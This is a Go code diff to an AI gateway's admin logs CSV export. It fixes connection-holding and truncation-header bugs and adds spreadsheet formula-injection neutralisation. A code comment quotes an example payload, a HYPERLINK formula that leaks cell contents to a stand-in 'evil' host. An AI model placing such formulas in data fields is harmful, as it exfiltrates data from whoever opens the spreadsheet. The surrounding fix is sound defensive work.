@@ -17,8 +17,10 @@ import (
 
 	"ai-gateway/internal/auth"
 	"ai-gateway/internal/db"
+
 	"ai-gateway/internal/httperr"
 	"ai-gateway/internal/webhook"
+	"github.com/rs/zerolog/log"
 )
 
 // logsExportMaxRows caps a single CSV download. Beyond this the export is
@@ -66,25 +68,18 @@ func (h *AdminHandler) LogsExport(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, `{"error":"query failed"}`, http.StatusInternalServerError)
 		return
 	}
-	defer rows.Close()
-
-	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
-	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="logs-%s.csv"`, time.Now().UTC().Format("20060102-150405")))
-	w.WriteHeader(http.StatusOK)
-
-	// RFC 4180 quoting (same helper style as BillingExport).
-	qq := func(s string) string {
-		if strings.ContainsAny(s, ",\"\n\r") {
-			return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
-		}
-		return s
-	}
-	w.Write([]byte("id,key_prefix,key_id,provider_id,model,endpoint,status,latency_ms,ttft_ms,created_at,prompt_tokens,completion_tokens,total_tokens,cost_usd,is_stream,finish_reason,error\n"))
-
-	written := 0
+	// Materialise the bounded result, THEN close the cursor and write.
+	//
+	// Streaming inside rows.Next() held the process's only SQLite connection
+	// (db.go SetMaxOpenConns(1)) for as long as the client took to read, with
+	// WriteTimeout deliberately 0: a throttled client stalled /ready and every
+	// /v1 auth+usage write behind it (measured: /api/logs timed out at 15 s,
+	// /ready at 5 s). The row cap makes this a few MB at most.
+	lines := make([]string, 0, 256)
 	truncated := false
+	skipped := 0
 	for rows.Next() {
-		if written >= logsExportMaxRows {
+		if len(lines) >= logsExportMaxRows {
 			truncated = true
 			break
 		}
@@ -97,6 +92,7 @@ func (h *AdminHandler) LogsExport(w http.ResponseWriter, r *http.Request) {
 		var costUSD float64
 		var isStream bool
 		if err := rows.Scan(&id, &keyPrefix, &keyID, &providerID, &model, &endpoint, &status, &latencyMs, &ttftMs, &createdAt, &promptTokens, &completionTokens, &totalTokens, &costUSD, &isStream, &finishReason, &errMsg); err != nil {
+			skipped++
 			continue
 		}
 		ts := ""
@@ -107,15 +103,70 @@ func (h *AdminHandler) LogsExport(w http.ResponseWriter, r *http.Request) {
 		if isStream {
 			stream = "1"
 		}
-		fmt.Fprintf(w, "%s,%s,%s,%s,%s,%s,%d,%d,%d,%s,%d,%d,%d,%.6f,%s,%s,%s\n",
-			qq(id), qq(keyPrefix), qq(keyID.String), qq(providerID.String), qq(model), qq(endpoint),
+		lines = append(lines, fmt.Sprintf("%s,%s,%s,%s,%s,%s,%d,%d,%d,%s,%d,%d,%d,%.6f,%s,%s,%s\n",
+			csvQuote(id), csvQuote(keyPrefix), csvQuote(keyID.String), csvQuote(providerID.String), csvQuote(model), csvQuote(endpoint),
 			status, latencyMs, ttftMs, ts, promptTokens, completionTokens, totalTokens, costUSD,
-			stream, qq(finishReason), qq(errMsg.String))
-		written++
+			stream, csvQuote(finishReason), csvQuote(errMsg.String)))
 	}
+	if rerr := rows.Err(); rerr != nil {
+		rows.Close()
+		log.Warn().Err(rerr).Msg("logs export: row iteration failed")
+		http.Error(w, `{"error":"query failed"}`, http.StatusInternalServerError)
+		return
+	}
+	rows.Close()
+
+	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="logs-%s.csv"`, time.Now().UTC().Format("20060102-150405")))
+	// Truncation is decided BEFORE the headers go out, so the signal is actually
+	// transmitted (it used to be set after WriteHeader, which can never work).
 	if truncated {
 		w.Header().Set("X-Truncated", "true")
-		// Header already sent, so signal truncation in-band too.
+	}
+	// A dead peer must not pin this goroutine after the DB work is done.
+	_ = http.NewResponseController(w).SetWriteDeadline(time.Now().Add(60 * time.Second))
+	w.WriteHeader(http.StatusOK)
+
+	// RFC 4180 quoting plus spreadsheet formula neutralisation (csvQuote).
+	w.Write([]byte("id,key_prefix,key_id,provider_id,model,endpoint,status,latency_ms,ttft_ms,created_at,prompt_tokens,completion_tokens,total_tokens,cost_usd,is_stream,finish_reason,error\n"))
+	for _, line := range lines {
+		if _, werr := w.Write([]byte(line)); werr != nil {
+			return
+		}
+	}
+	if truncated {
+		// In-band too: some proxies strip custom response headers.
 		fmt.Fprintf(w, "# truncated at %d rows — narrow the filters\n", logsExportMaxRows)
 	}
+	if skipped > 0 {
+		fmt.Fprintf(w, "# %d rows skipped (scan error)\n", skipped)
+	}
+}
+
+// csvSafe neutralises spreadsheet formula injection before RFC 4180 quoting.
+//
+// model, endpoint, error and key_prefix are all attacker-influenced (model and
+// endpoint come straight from the client request body; error is upstream text).
+// Excel and LibreOffice execute a cell that begins with = + - @ or a tab/CR, so
+// a client that sends `{"model":"=HYPERLINK(\"http://evil/\"&A1,\"x\")"}` gets
+// its formula evaluated with the privileges of the operator who opens the
+// billing export. Prefixing with an apostrophe makes the cell text.
+func csvSafe(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
+}
+
+// csvQuote applies csvSafe and then RFC 4180 quoting.
+func csvQuote(s string) string {
+	s = csvSafe(s)
+	if strings.ContainsAny(s, ",\"\n\r") {
+		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
+	}
+	return s
 }
